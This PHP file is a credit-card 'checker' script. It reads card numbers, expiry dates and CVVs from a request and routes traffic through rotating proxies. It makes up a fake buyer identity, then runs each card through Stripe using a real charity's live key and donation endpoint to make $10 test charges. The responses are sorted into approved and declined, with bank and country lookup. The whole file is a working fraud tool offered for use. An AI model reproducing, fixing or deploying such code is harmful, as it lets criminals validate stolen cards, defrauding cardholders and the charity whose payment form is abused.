<?php

////////////////////////////////////////////////////////Base edited by @FELLOW0p////////////////////////////////////////////////////////////////



error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');


function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}
function proxy()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = proxy();


////////////////////////////===[Randomizing Details Api]

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];



//$username = 'lum-customer-bgvfc-zone-devils';
//$password = 'jhg g f';
//$port = 22225;
//$session = mt_rand();
//$super_proxy = 'zproxy.lum-superproxy.io';
//curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 0);
//curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
//curl_setopt($ch, CURLOPT_RETURNTRANSFER, 0);
//curl_setopt($ch, CURLOPT_CUSTOMREQUEST,'GET');
//curl_setopt ($ch, CURLOPT_HEADER, 1);
//curl_exec ($ch); 
//$curl_scraped_page = curl_exec($ch);
//curl_close($ch);

//echo $curl_scraped_page;


/////////////////////////////////////////////////////////////////=[1st REQ]=/////////////////////////////////////////////////////////////////////



$ch = curl_init();
//curl_setopt($ch, CURLOPT_PROXY, "................................."); 
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, ".........................."); 
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: api.sripe.com',
'accept: application/json',
'accept-language: en-US,en;q=0.9',
'Origin:https://js.stripe.com',
'Referer: https://js.stripe.com/v3/controller-4d9e2748fded80eb3cb59929da42d98b.html',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'content-type: application/x-www-form-urlencoded',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36 Edg/85.0.564.68'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[email]='.$email.'&billing_details[address][postal_code]='.$postcode.'&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=4e78076c-7dd7-4bdb-867d-e95589f028b67f182b&muid=de16bbd9-dfb0-4327-803d-696ab2be5816c22094&sid=2c734dac-631c-4115-94a2-db6d5813c7b371e6ae&pasted_fields=number&payment_user_agent=stripe.js%2F1694e450%3B+stripe-js-v3%2F1694e450&time_on_page=113030&referrer=https%3A%2F%2Fclauses4causes.gives%2Fdonations%2F&key=pk_live_raziDtTYRFQdANblPTY3KklU');

  $result1 = curl_exec($ch);

  $id = trim(strip_tags(getStr($result1,'"id": "','"')));
 




/////////////////////////////////////////////////////////////////=[2nd REQ]=/////////////////////////////////////////////////////////////////////




$ch = curl_init();
//curl_setopt($ch, CURLOPT_PROXY, "..................................."); 
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, "............................"); 
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: api.stripe.com',
'origin: https://js.stripe.com',
'Referer: https://js.stripe.com/v3/controller-4d9e2748fded80eb3cb59929da42d98b.html',
'accept: application/json',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36 Edg/85.0.564.68'));


curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[address_zip]='.$postcode.'&guid=4e78076c-7dd7-4bdb-867d-e95589f028b67f182b&muid=de16bbd9-dfb0-4327-803d-696ab2be5816c22094&sid=2c734dac-631c-4115-94a2-db6d5813c7b371e6ae&payment_user_agent=stripe.js%2F1694e450%3B+stripe-js-v3%2F1694e450&time_on_page=114018&referrer=https%3A%2F%2Fclauses4causes.gives%2Fdonations%2F&key=pk_live_raziDtTYRFQdANblPTY3KklU&pasted_fields=number');

   $result2 = curl_exec($ch);

   $message = trim(strip_tags(getstr($result2,'"message":"','"')));

   $token = trim(strip_tags(getStr($result2,'"id": "','"')));
 





/////////////////////////////////////////////////////////////=[3Req]=//////////////////////////////////////////////////////////////////////



$ch = curl_init();
//curl_setopt($ch, CURLOPT_PROXY, "..................................."); 
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, "..................................."); 
curl_setopt($ch, CURLOPT_URL, 'https://clauses4causes.gives/wp-admin/admin-ajax.php');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: clauses4causes.gives',
'origin: https://clauses4causes.gives',
'Referer: https://clauses4causes.gives/donations/',
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'accept: */*',
'Cookie: asp_transient_id=a8e0326b8726e2d2ca1c68625f8de171; simpay_wp_session=3c790fe5a4892d3e2597c03c23c872ac%7C%7C1601846882%7C%7C1601846822; __stripe_mid=de16bbd9-dfb0-4327-803d-696ab2be5816c22094; __stripe_sid=2c734dac-631c-4115-94a2-db6d5813c7b371e6ae',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36 Edg/85.0.564.68'));


curl_setopt($ch, CURLOPT_POSTFIELDS, 'action=ds_process_button&stripeToken='.$token.'&paymentMethodID=p'.$id.'&allData%5BbillingDetails%5D%5Bemail%5D='.$email.'&type=payment&amount=MTAuMDA%3D&params%5Bvalue%5D=ds-1539699755842&params%5Bname%5D=Clauses4Causes&params%5Bamount%5D=MTAuMDA%3D&params%5Bdescription%5D=Thank+you+for+your+%2410+donation!&params%5Bpanellabel%5D=Donate+%2410&params%5Btype%5D=payment&params%5Bcoupon%5D=&params%5Bsetup_fee%5D=&params%5Bzero_decimal%5D=1&params%5Bcapture%5D=1&params%5Bdisplay_amount%5D=1&params%5Bcurrency%5D=USD&params%5Blocale%5D=&params%5Bsuccess_query%5D=&params%5Berror_query%5D=&params%5Bsuccess_url%5D=&params%5Berror_url%5D=&params%5Bbutton_id%5D=MyButton&params%5Bcustom_role%5D=&params%5Bbilling%5D=&params%5Bshipping%5D=&params%5Brememberme%5D=&params%5Bkey%5D=pk_live_raziDtTYRFQdANblPTY3KklU&params%5Bcurrent_email_address%5D=&params%5Bajaxurl%5D=https%3A%2F%2Fclauses4causes.gives%2Fwp-admin%2Fadmin-ajax.php&params%5Bimage%5D=https%3A%2F%2Fclauses4causes.gives%2Fwp-content%2Fuploads%2F2018%2F05%2Flogo-new-small-c4c-worpress-webicon.jpg&params%5Binstance%5D=ds1539699755842&params%5Bds_nonce%5D=c563850c1d&ds_nonce=c563850c1d');



 $result3 = curl_exec($ch);

 $message = trim(strip_tags(getstr($result3,'"message":"','"')));




///////////////////////////////////////////////////////////[Bin Lookup Api] ////////////////////////////////////////////////////////////////////



$cctwo = substr("$cc", 0, 6);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cctwo.'');
curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$fim = json_decode($fim,true);
$bank = $fim['bank']['name'];
$country = $fim['country']['alpha2'];
$type = $fim['type'];
//$base= $FELLOW0p

if(strpos($fim, '"type":"credit"') !== false) {
  $type = 'Credit';
} else {
  $type = 'Debit';
}

      
      
/////////////////////////////////////////////////////////[CARD Responses]///////////////////////////////////////////////////////////////////////




if(strpos($result3, '/donations/thank_you?donation_number=','' )) {
    echo '<span class="badge badge-success">Aprovadas</span> ✪ </span> </span> <span class="badge badge-success">'.$lista.'</span> ✪ <span class="badge badge-info"> 「Approved (͏CVV) FELLOW  」</span> ✪</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2,'"cvc_check":"pass",')){
    echo '<span class="badge badge-success">Aprovadas</span> ✪ </span> </span> <span class="badge badge-success">'.$lista.'</span> ✪ <span class="badge badge-info"> 「Approved (͏CVV)_ FELLOW  」</span> ✪</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3, "Thank You For Donation." )) {
    echo '<span class="badge badge-success">Aprovadas</span> ✪ </span> </span> <span class="badge badge-success">'.$lista.'</span> ✪ <span class="badge badge-info"> 「Approved (͏CVV) FELLOW  </span> ✪</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3, "Thank You." )) {
    echo '<span class="badge badge-success">Aprovadas</span> ✪ </span> </span> <span class="badge badge-success">'.$lista.'</span> ✪ <span class="badge badge-info"> 「Approved (͏CVV) FELLOW  </span> ✪</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3,'"address_zip_check":"fail"')){
    echo '<span class="badge badge-success">Aprovadas</span> ✪ </span> </span> <span class="badge badge-success">'.$lista.'</span> ✪ <span class="badge badge-info"> 「Approved (͏CVV)_ FELLOW  」</span> ✪</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3, 'Your card zip code is incorrect.' )) {
    echo '<span class="badge badge-success">Aprovadas</span> ✪ </span> </span> <span class="badge badge-success">'.$lista.'</span> ✪ <span class="badge badge-info"> 「Approved (͏CVV - Incorrect Zip)_ FELLOW  </span> ✪</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3, "incorrect_zip" )) {
    echo '<span class="badge badge-success">Aprovadas</span> ✪ </span> </span> <span class="badge badge-success">'.$lista.'</span> ✪ <span class="badge badge-info"> 「Approved (͏CVV - Incorrect Zip_ FELLOW  )」</span> ✪</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3, "Success" )) {
    echo '<span class="badge badge-success">Aprovadas</span> ✪ </span> </span> <span class="badge badge-success">'.$lista.'</span> ✪ <span class="badge badge-info"> 「Approved (͏CVV)_ FELLOW  」</span> ✪</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3, "succeeded." )) {
    echo '<span class="badge badge-success">Aprovadas</span> ✪ </span> </span> <span class="badge badge-success">'.$lista.'</span> ✪ <span class="badge badge-info"> 「Approved (͏CVV)_ FELLOW  」</span> ✪</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2,"fraudulent")){
    echo '<span class="badge badge-success">Aprovadas</span> ✪ </span> </span> <span class="badge badge-success">'.$lista.'</span> ✪ <span class="badge badge-info"> 「Fraudulent Card_ FELLOW  」</span> ✪</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result,"fraudulent")){
    echo '<span class="badge badge-success">Aprovadas</span> ✪ </span> </span> <span class="badge badge-success">'.$lista.'</span> ✪ <span class="badge badge-info"> 「Fraudulent Card_ FELLOW  」</span> ✪</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3, 'Your card has insufficient funds.')) {
    echo '<span class="badge badge-success">Aprovadas</span> ✪ </span> </span> <span class="badge badge-success">'.$lista.'</span> ✪ <span class="badge badge-info"> 「Insufficient Funds_ FELLOW  」</span> ✪</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3, "insufficient_funds")) {
    echo '<span class="badge badge-success">Aprovadas</span> ✪ </span> </span> <span class="badge badge-success">'.$lista.'</span> ✪ <span class="badge badge-info"> 「Insufficient Funds_ FELLOW  」</span> ✪</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3, "lost_card" )) {
    echo '<span class="badge badge-success">Aprovadas</span> ✪ </span> </span> <span class="badge badge-success">'.$lista.'</span> ✪ <span class="badge badge-info"> 「Lost Card_ FELLOW  」</span> ✪</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3, "stolen_card" )) {
    echo '<span class="badge badge-success">Aprovadas</span> ✪ </span> </span> <span class="badge badge-success">'.$lista.'</span> ✪ <span class="badge badge-info"> 「Stolen Card_ FELLOW  」</span> ✪</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2, 'security code is incorrect.' )) {
    echo '<span class="badge badge-success">Aprovadas</span> ✪ </span> </span> <span class="badge badge-success">'.$lista.'</span> ✪ <span class="badge badge-info"> 「Approved (CCN)_ FELLOW  」</span> ✪</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
    }
elseif(strpos($result3, "Your card's security code is incorrect." )) {
    echo '<span class="badge badge-success">Aprovadas</span> ✪ </span> </span> <span class="badge badge-success">'.$lista.'</span> ✪ <span class="badge badge-info"> 「Approved (CCN)_ FELLOW  」</span> ✪</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
     }
elseif(strpos($result2, "Your card's security code is incorrect." )) {
    echo '<span class="badge badge-success">Aprovadas</span> ✪ </span> </span> <span class="badge badge-success">'.$lista.'</span> ✪ <span class="badge badge-info"> 「Approved (CCN)_ FELLOW  」</span> ✪</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2, 'security code is invalid.' )) {
    echo '<span class="badge badge-success">Aprovadas</span> ✪ </span> </span> <span class="badge badge-success">'.$lista.'</span> ✪ <span class="badge badge-info"> 「Approved (CCN)_ FELLOW  」</span> ✪</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2, "incorrect_cvc" )) {
    echo '<span class="badge badge-success">Aprovadas</span> ✪ </span> </span> <span class="badge badge-success">'.$lista.'</span> ✪ <span class="badge badge-info"> 「Approved (CCN)_ FELLOW  」</span> ✪</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2, "pickup_card" )) {
    echo '<span class="badge badge-success">Aprovadas</span> ✪ </span> </span> <span class="badge badge-success">'.$lista.'</span> ✪ <span class="badge badge-info"> 「Pickup Card (Reported Stolen Or Lost)_ FELLOW  」</span> ✪</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2, 'Your card has expired.')) {
    echo '<span class="badge badge-danger">Reprovadas</span> ✪ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ✪ <span class="badge badge-info"> 「Expired Card_ FELLOW  」</span> ✪</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2, "expired_card" )) {
    echo '<span class="badge badge-danger">Reprovadas</span> ✪ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ✪ <span class="badge badge-info"> 「Expired Card_ FELLOW  </span> ✪</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3, "incorrect_cvc" )) {
    echo '<span class="badge badge-success">Aprovadas</span> ✪ </span> </span> <span class="badge badge-success">'.$lista.'</span> ✪ <span class="badge badge-info"> 「Approved  FELLOW  」</span> ✪</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3, "pickup_card" )) {
    echo '<span class="badge badge-success">Aprovadas</span> ✪ </span> </span> <span class="badge badge-success">'.$lista.'</span> ✪ <span class="badge badge-info"> 「Pickup Card (Reported Stolen Or Lost)_ FELLOW  」</span> ✪</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3, 'Your card has expired.')) {
    echo '<span class="badge badge-danger">Reprovadas</span> ✪ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ✪ <span class="badge badge-info"> 「Expired Card_ FELLOW  」</span> ✪</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3, "expired_card" )) {
    echo '<span class="badge badge-danger">Reprovadas</span> ✪ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ✪ <span class="badge badge-info"> 「Expired Card_ FELLOW  」</span> ✪</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
    }
elseif(strpos($result2, 'Your card number is incorrect.')) {
    echo '<span class="badge badge-danger">Reprovadas</span> ✪ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ✪ <span class="badge badge-info"> 「Incorrect Card Number_ FELLOW  」</span> ✪</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2, "incorrect_number")) {
    echo '<span class="badge badge-danger">Reprovadas</span> ✪ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ✪ <span class="badge badge-info"> 「Incorrect Card Number_ FELLOW  」</span> ✪</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}

elseif(strpos($result1, "do_not_honor")) {
    echo '<span class="badge badge-danger">Reprovadas</span> ✪ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ✪ <span class="badge badge-info"> 「Declined : Do_Not_Honor_ FELLOW  」</span> ✪</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result1, 'Your card was declined.')) {
    echo '<span class="badge badge-danger">Reprovadas</span> ✪ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ✪ <span class="badge badge-info"> 「Card Declined_ FELLOW  」</span> ✪</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2, 'Your card was declined.')) {
    echo '<span class="badge badge-danger">Reprovadas</span> ✪ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ✪ <span class="badge badge-info"> 「Card Declined_ FELLOW  」</span> ✪</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
    }
elseif(strpos($result3, 'Your card was declined.')) {
    echo '<span class="badge badge-danger">Reprovadas</span> ✪ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ✪ <span class="badge badge-info"> 「Card Declined_ FELLOW  」</span> ✪</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}

elseif(strpos($result2, "generic_decline")) {
    echo '<span class="badge badge-danger">Reprovadas</span> ✪ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ✪ <span class="badge badge-info"> 「Declined : Generic_Decline_ FELLOW  」</span> ✪</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2,'"cvc_check": "unavailable"')){
    echo '<span class="badge badge-danger">Reprovadas</span> ✪ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ✪ <span class="badge badge-info"> 「CVC_Check : Unavailable_ FELLOW  」</span> ✪</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}

elseif(strpos($result2,'"cvc_check": "fail"')){
    echo '<span class="badge badge-danger">Reprovadas</span> ✪ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ✪ <span class="badge badge-info"> 「CVC_Unchecked : Fail_ FELLOW  」</span> ✪</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2,"parameter_invalid_empty")){
    echo '<span class="badge badge-danger">「Declined」</span> ✪ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ✪ <span class="badge badge-info"> 「Declined : Missing Card Details_ FELLOW  」</span> ✪</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}

elseif (strpos($result2,'Your card does not support this type of purchase.')) {
    echo '<span class="badge badge-danger">Reprovadas</span> ✪ </span> <span class="badge badge-danger">'.$lista.'</span> ✪ <span class="badge badge-info"> 「Card Doesnt Support Purchase_ FELLOW  」 </span> ✪</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2,"transaction_not_allowed")){
    echo '<span class="badge badge-danger">Reprovadas</span> ✪ </span> <span class="badge badge-danger">'.$lista.'</span> ✪ <span class="badge badge-info"> 「Card Doesnt Support Purchase FELLOW  」 </span> ✪</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3,"three_d_secure_redirect")){
     echo '<span class="badge badge-danger">Reprovadas</span> ✪ </span> <span class="badge badge-danger">'.$lista.'</span> ✪ <span class="badge badge-info"> 「Card Doesnt Support Purchase_ FELLOW  」 </span> ✪</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3, 'Card is declined by your bank, please contact them for additional information.')) {
    echo '<span class="badge badge-danger">Reprovadas</span> ✪ </span> <span class="badge badge-danger">'.$lista.'</span> ✪ <span class="badge badge-info"> 「3D Secure Redirect_ FELLOW  」 </span> ✪</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2,"missing_payment_information")){
     '<span class="badge badge-danger">Reprovadas</span> ✪ </span> <span class="badge badge-danger">'.$lista.'</span> ✪ <span class="badge badge-info"> 「Missing Payment Informations_ FELLOW  」 </span> ✪</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2, "Payment cannot be processed, missing credit card number")) {
     '<span class="badge badge-danger">Reprovadas</span> ✪ </span> <span class="badge badge-danger">'.$lista.'</span> ✪ <span class="badge badge-info"> 「Missing Credit Card Number FELLOW  」 </span> ✪</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
else {
    echo '<span class="badge badge-danger">Reprovadas</span> ✪ </span> <span class="badge badge-danger">'.$lista.'</span> ✪ <span class="badge badge-info"> 「Dead Proxy/Error Not listed FELLOW  」 </span> ✪</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}

//echo "<b>1REQ Result:</b> $result1<br><br>";
//echo "<b>2REQ Result:</b> $result2<br><br>";
echo "<b>3REQ Result:</b> $result3<br><br>";

//THIS API IS CREATED BY FELLOW KING
//USERNAME - @HeavenInTheHell007
//YOU CAN DO IT
?>